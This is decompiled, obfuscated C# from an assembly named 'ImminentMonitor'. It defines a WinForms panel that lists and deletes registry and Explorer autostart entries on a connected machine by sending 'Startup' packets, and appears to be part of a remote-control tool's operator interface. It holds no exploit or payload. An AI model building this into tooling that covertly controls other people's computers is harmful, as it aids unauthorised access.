// Decompiled with JetBrains decompiler
// Type: UserControlStartup
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlStartup : UserControl
{
  private IContainer icontainer_0;
  private GClass41 gclass41_0;
  private ColumnHeader columnHeader_0;
  private ColumnHeader columnHeader_1;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ImageList imageList_0;
  private GClass18 gclass18_0;

  public UserControlStartup()
  {
    this.Load += new EventHandler(this.UserControlStartup_Load);
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (UserControlStartup));
    this.vmethod_1(new GClass41());
    this.vmethod_3(new ColumnHeader());
    this.vmethod_5(new ColumnHeader());
    this.vmethod_7(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_9(new ToolStripMenuItem());
    this.vmethod_11(new ToolStripMenuItem());
    this.vmethod_13(new ImageList(this.icontainer_0));
    this.vmethod_6().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_0().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_0().Columns.AddRange(new ColumnHeader[2]
    {
      this.vmethod_2(),
      this.vmethod_4()
    });
    this.vmethod_0().ContextMenuStrip = this.vmethod_6();
    this.vmethod_0().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_0().FullRowSelect = true;
    this.vmethod_0().HideSelection = false;
    this.vmethod_0().Location = new Point(3, 3);
    this.vmethod_0().Name = "ListViewStartups";
    GClass41 gclass41 = this.vmethod_0();
    Size size1 = new Size(731, 477);
    Size size2 = size1;
    gclass41.Size = size2;
    this.vmethod_0().SmallImageList = this.vmethod_12();
    this.vmethod_0().TabIndex = 14;
    this.vmethod_0().UseCompatibleStateImageBehavior = false;
    this.vmethod_0().View = View.Details;
    this.vmethod_2().Text = "Entry Name";
    this.vmethod_2().Width = 207;
    this.vmethod_4().Text = "Location";
    this.vmethod_4().TextAlign = HorizontalAlignment.Center;
    this.vmethod_4().Width = 442;
    this.vmethod_6().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_6().Items.AddRange(new ToolStripItem[2]
    {
      (ToolStripItem) this.vmethod_8(),
      (ToolStripItem) this.vmethod_10()
    });
    this.vmethod_6().Name = "cntStartups";
    ContextMenuStrip contextMenuStrip = this.vmethod_6();
    size1 = new Size(119, 48);
    Size size3 = size1;
    contextMenuStrip.Size = size3;
    this.vmethod_8().Name = "RefreshToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_8();
    size1 = new Size(118, 22);
    Size size4 = size1;
    toolStripMenuItem1.Size = size4;
    this.vmethod_8().Tag = (object) "0";
    this.vmethod_8().Text = "Refresh";
    this.vmethod_10().Name = "DeleteToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_10();
    size1 = new Size(118, 22);
    Size size5 = size1;
    toolStripMenuItem2.Size = size5;
    this.vmethod_10().Tag = (object) "0";
    this.vmethod_10().Text = "Delete";
    this.vmethod_12().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListStartup.ImageStream");
    this.vmethod_12().TransparentColor = Color.Transparent;
    this.vmethod_12().Images.SetKeyName(0, "arrow-split-090.png");
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlStartup);
    size1 = new Size(736, 483);
    this.Size = size1;
    this.vmethod_6().ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual GClass41 vmethod_0() => this.gclass41_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(GClass41 gclass41_1) => this.gclass41_0 = gclass41_1;

  internal virtual ColumnHeader vmethod_2() => this.columnHeader_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(ColumnHeader columnHeader_2) => this.columnHeader_0 = columnHeader_2;

  internal virtual ColumnHeader vmethod_4() => this.columnHeader_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(ColumnHeader columnHeader_2) => this.columnHeader_1 = columnHeader_2;

  internal virtual ContextMenuStrip vmethod_6() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_8() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_5);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_10() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_6);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual ImageList vmethod_12() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ImageList imageList_1) => this.imageList_0 = imageList_1;

  public GClass18 method_0() => this.gclass18_0;

  public void method_1(GClass18 gclass18_1) => this.gclass18_0 = gclass18_1;

  public void method_2()
  {
    object[] object_0 = new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Startup,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.Refresh
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  private void method_3(
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket startupPacket_0,
    string string_0,
    string string_1)
  {
    object[] object_0 = new object[5]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Startup,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.Delete,
      (object) startupPacket_0,
      (object) string_0,
      (object) string_1
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_4(object[] object_0)
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      if (!this.InvokeRequired)
        goto label_3;
label_2:
      num3 = 3;
      this.Invoke((Delegate) new Class97.Delegate9(this.method_4), (object) object_0);
      goto label_30;
label_3:
      num3 = 5;
label_4:
      num3 = 6;
      this.vmethod_0().Items.Clear();
label_5:
      num3 = 7;
      int num4 = object_0.Length - 1;
      int index = 2;
label_6:
      if (index > num4)
        goto label_30;
label_7:
      num3 = 8;
      ListViewItem listViewItem = new ListViewItem();
label_8:
      num3 = 9;
      listViewItem.ImageIndex = 0;
label_9:
      num3 = 10;
      string str1 = (string) object_0[index + 1];
label_10:
      num3 = 11;
      string str2 = (string) object_0[index + 2];
label_11:
      num3 = 12;
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket startupPacket = (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket) object_0[index + 3];
label_12:
      num3 = 13;
      string str3 = (string) object_0[index + 4];
label_13:
      num3 = 14;
      listViewItem.Text = str1;
label_14:
      num3 = 15;
      listViewItem.SubItems.Add(str2);
label_15:
      num3 = 16;
      listViewItem.Tag = (object) startupPacket;
label_16:
      num3 = 17;
      listViewItem.Name = str3;
label_17:
      num3 = 18;
      string str4 = (string) object_0[index];
label_18:
      num3 = 19;
      if (this.method_7(str4))
        goto label_23;
label_19:
      num3 = 20;
      this.vmethod_0().Groups.Add(new ListViewGroup(str4));
      goto label_23;
label_20:
      num3 = 23;
      if (Operators.CompareString(str2, string.Empty, false) == 0)
        goto label_22;
label_21:
      num3 = 24;
      this.vmethod_0().Items.Add(listViewItem);
label_22:
      num3 = 26;
      index += 4;
      goto label_6;
label_23:
      num3 = 22;
      listViewItem.Group = this.vmethod_0().Groups[this.method_8((ListView) this.vmethod_0(), str4)];
      goto label_20;
label_25:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num5 = num2 + 1;
          num2 = 0;
          switch (num5)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
            case 27:
            case 28:
              goto label_30;
            case 5:
              goto label_3;
            case 6:
              goto label_4;
            case 7:
              goto label_5;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 12:
              goto label_11;
            case 13:
              goto label_12;
            case 14:
              goto label_13;
            case 15:
              goto label_14;
            case 16:
              goto label_15;
            case 17:
              goto label_16;
            case 18:
              goto label_17;
            case 19:
              goto label_18;
            case 20:
              goto label_19;
            case 21:
            case 22:
              goto label_23;
            case 23:
              goto label_20;
            case 24:
              goto label_21;
            case 25:
            case 26:
              goto label_22;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_25;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_30:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void method_5(object sender, EventArgs e) => this.method_2();

  private void method_6(object sender, EventArgs e)
  {
    if (this.vmethod_0().SelectedItems.Count <= 0)
      return;
    object tag = this.vmethod_0().SelectedItems[0].Tag;
    if (Operators.ConditionalCompareObjectEqual(tag, (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.HKCU, false))
      this.method_3(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.HKCU, this.vmethod_0().SelectedItems[0].Name.Replace("HKEY_LOCAL_MACHINE\\", string.Empty).Replace("HKEY_CURRENT_USER\\", string.Empty), this.vmethod_0().SelectedItems[0].Text);
    else if (Operators.ConditionalCompareObjectEqual(tag, (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.HKLM, false))
      this.method_3(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.HKLM, this.vmethod_0().SelectedItems[0].Name.Replace("HKLM\\", string.Empty), this.vmethod_0().SelectedItems[0].Text);
    else if (Operators.ConditionalCompareObjectEqual(tag, (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.Explorer, false))
      this.method_3(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.Explorer, this.vmethod_0().SelectedItems[0].SubItems[1].Text, (string) null);
    this.method_2();
  }

  public bool method_7(string string_0) => this.vmethod_0().Groups.Cast<ListViewGroup>().Any<ListViewGroup>(new Func<ListViewGroup, bool>(new UserControlStartup.Class150()
  {
    string_0 = string_0
  }._Lambda\u0024__76));

  public int method_8(ListView listView_0, string string_0)
  {
    int num = listView_0.Groups.Count - 1;
    for (int index = 0; index <= num; ++index)
    {
      if (Operators.CompareString(listView_0.Groups[index].Header, string_0, false) == 0)
        return index;
    }
    return 0;
  }

  private void UserControlStartup_Load(object sender, EventArgs e)
  {
    if (this.DesignMode)
      return;
    Class97.smethod_15(this.vmethod_6());
    Class97.smethod_7(this.vmethod_6());
  }

  internal sealed class Class150
  {
    public string string_0;

    [CompilerGenerated]
    [SpecialName]
    public bool _Lambda\u0024__76(ListViewGroup listViewGroup_0) => Operators.CompareString(listViewGroup_0.Header, this.string_0, false) == 0;
  }
}
